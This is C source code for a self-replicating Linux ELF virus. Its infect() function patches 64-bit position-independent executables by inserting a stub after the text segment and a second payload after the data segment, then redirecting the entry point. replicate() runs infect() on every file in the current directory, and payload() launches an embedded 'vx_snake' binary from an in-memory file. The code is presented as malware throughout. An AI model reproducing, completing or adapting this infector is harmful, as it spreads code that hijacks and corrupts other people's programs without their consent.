#include "vx_snake.h"
#include "wrapper.h"
#include "include/elf.h"

#define PAGE_SIZE 4096
#define TMP ".gripe"

struct args
{
    unsigned int patch_offset;
    unsigned long politic_entry;
    unsigned long politic_len;
    unsigned long payload_addr;
    unsigned long payload_entry;
    unsigned long payload_len;
    unsigned char *_start;
    unsigned char *politic;
    unsigned char *payload;
    unsigned long infmagic_off;
};

char elfmag[4] = {'\x7f', 'E', 'L', 'F'};
unsigned long magic = 0xbebacafebebacafe;
unsigned long magic_infected = 0xbebacafebebacafe;
struct args *arg = NULL;

void infect(char *path)
{
    Elf64_Off text_off = 0;
    Elf64_Addr text_vaddr;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    int host_fd, ofd;
    struct stat st;
    char *host_mem;

    if ((host_fd = open(path, O_RDWR, 0)) < 0)
        return 1;

    fstat(host_fd, &st);
    host_mem = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, host_fd, 0);
    close(host_fd);

    if (host_mem == NULL)
        return 2;

    //checking for elf files
    for (int j = 0; j < 4; j++)
        if (host_mem[j] != elfmag[j])
        {
            munmap(host_mem, st.st_size);
            close(host_fd);
            return;
        }

    ehdr = (Elf64_Ehdr *)host_mem;
    phdr = (Elf64_Phdr *)(host_mem + ehdr->e_phoff);
    shdr = (Elf64_Shdr *)(host_mem + ehdr->e_shoff);
    Elf64_Addr original_entry;
    Elf64_Addr new_entry, data_vaddr;
    unsigned long end_of_text;
    unsigned long end_of_data = ~(0UL);
    unsigned long bss_size;

    if (ehdr->e_type != ET_DYN)
        return;

    for (int i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_X | PF_R))
        {
            //CHeking for infected files
            Elf64_Addr entry = ehdr->e_entry - phdr[i].p_vaddr + phdr[i].p_offset;

            unsigned char *cmp = (&host_mem[entry]) + arg->infmagic_off;
            unsigned char *cmp2 = &magic_infected;

            for (int i = 0; i < 8; i++)
            {
                if (cmp[i] != cmp2[i])
                    break;
                if (i == 7)
                {
                    munmap(host_mem, st.st_size);
                    close(host_fd);
                    return;
                }
            }

            original_entry = ehdr->e_entry - phdr[i].p_vaddr + phdr[i].p_offset;
            end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
            new_entry = phdr[i].p_vaddr + phdr[i].p_memsz + arg->politic_entry;
            phdr[i].p_memsz += arg->politic_len;
            phdr[i].p_filesz += arg->politic_len;
            for (int j = i + 1; j < ehdr->e_phnum; j++)
            {
                if (phdr[j].p_type == PT_LOAD && phdr[j].p_flags == (PF_R | PF_W))
                {
                    bss_size = phdr[j].p_memsz - phdr[j].p_filesz;
                    end_of_data = phdr[j].p_offset + phdr[j].p_filesz;
                    data_vaddr = phdr[j].p_vaddr + phdr[j].p_filesz;
                    phdr[j].p_offset += PAGE_SIZE;
                    phdr[j].p_memsz += arg->payload_len + bss_size;
                    phdr[j].p_filesz += arg->payload_len + bss_size;
                }
                else if (phdr[j].p_offset > end_of_text)
                {
                    phdr[j].p_offset += PAGE_SIZE;
                }
            }
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        Elf64_Off tmp_off = shdr[i].sh_offset;

        if (tmp_off == end_of_data && shdr[i].sh_type == SHT_NOBITS)
        {
            shdr[i - 1].sh_size += arg->payload_len + bss_size;
            shdr[i].sh_offset = shdr[i - 1].sh_offset + shdr[i - 1].sh_size;
            shdr[i].sh_addr = shdr[i - 1].sh_addr + shdr[i - 1].sh_size;
            continue;
        }

        if (tmp_off >= end_of_data && shdr[i].sh_type)
        {
            shdr[i].sh_offset += arg->payload_len + bss_size;
        }

        if (tmp_off > end_of_text && shdr[i].sh_type)
        {
            shdr[i].sh_offset += PAGE_SIZE;
        }
        else if (shdr[i].sh_addr + shdr[i].sh_size == new_entry)
            shdr[i].sh_size += arg->politic_len;
    }

    ehdr->e_entry = new_entry;
    ehdr->e_shoff += PAGE_SIZE + arg->payload_len + bss_size;

    ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC,
               S_IRUSR | S_IXUSR | S_IWUSR);

    write(ofd, host_mem, end_of_text);
    //[EHDR][PHDRs][TEXT]
    write(ofd, arg->politic, arg->patch_offset);
    int o_entry_offset = -end_of_text + original_entry - arg->patch_offset - 4;
    write(ofd, &o_entry_offset, 4);
    write(ofd, arg->politic + arg->patch_offset + 4, 20);
    unsigned long payload_vaddr = (data_vaddr - new_entry) + bss_size;
    write(ofd, &payload_vaddr, 8);
    write(ofd, arg->politic + arg->patch_offset + 4 + 20 + 8,
          arg->politic_len - (arg->patch_offset + 4 + 20 + 8));
    //[EHDR][PHDRs][TEXT][VIRUS]
    lseek(ofd, PAGE_SIZE - arg->politic_len, SEEK_CUR);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD]
    write(ofd, host_mem + end_of_text, end_of_data - end_of_text);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA]
    lseek(ofd, bss_size, SEEK_CUR);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS]
    write(ofd, arg->payload, arg->payload_len);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2]
    write(ofd, host_mem + end_of_data, st.st_size - end_of_data);
    //[EHDR][PHDRs][TEXT][VIRUS+PAD][DATA][BSS][VIRUS2][SHDRs]

    close(ofd);
    munmap(host_mem, st.st_size);
    rename(TMP, path);
}

void replicate(void)
{
    struct linux_dirent64 *dirp = mmap(0, 1024, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct linux_dirent64 *entry;
    int dir_fd = open(".", O_RDONLY, 0);
    long bytes_read = 0;
    long pos;
    while ((bytes_read = getdents64(dir_fd, dirp, 1024)) > 0)
    {
        pos = 0;
        entry = dirp;
        while (pos < bytes_read)
        {
            infect(entry->d_name);
            entry = ((char *)entry) + entry->d_reclen;
            pos = (char *)entry - (char *)dirp;
        }
    }
    close(dir_fd);
    munmap(dirp, 1024);
}

long run_vxnake(void)
{
    char *envp[] =
        {
            "TERMINFO_DIRS=/lib/terminfo:/usr/lib/terminfo:/usr/share/terminfo",
            "TERM=xterm",
            0};

    char vx_path[32] = {'/', 'p', 'r', 'o', 'c', '/', 's', 'e', 'l', 'f', '/', 'f', 'd', '/', '\xff', '\0'};
    int vx_fd = memfd_create("vx_static", 0);
    vx_path[14] = vx_fd + 48;
    write(vx_fd, vx_snake, vx_snake_len);
    execve(vx_path, NULL, envp);
}

void payload(struct args *arg_loc)
{
    arg = arg_loc;
    replicate();

    char *vxnake_stack = mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    *(unsigned long *)(vxnake_stack + 1016) = &run_vxnake;
    int vxnake_pid = clone(0x100, vxnake_stack + 1016, 0, 0, 0);

    wait4(vxnake_pid, 0, __WALL, 0);

    munmap(vxnake_stack, 1024);
}
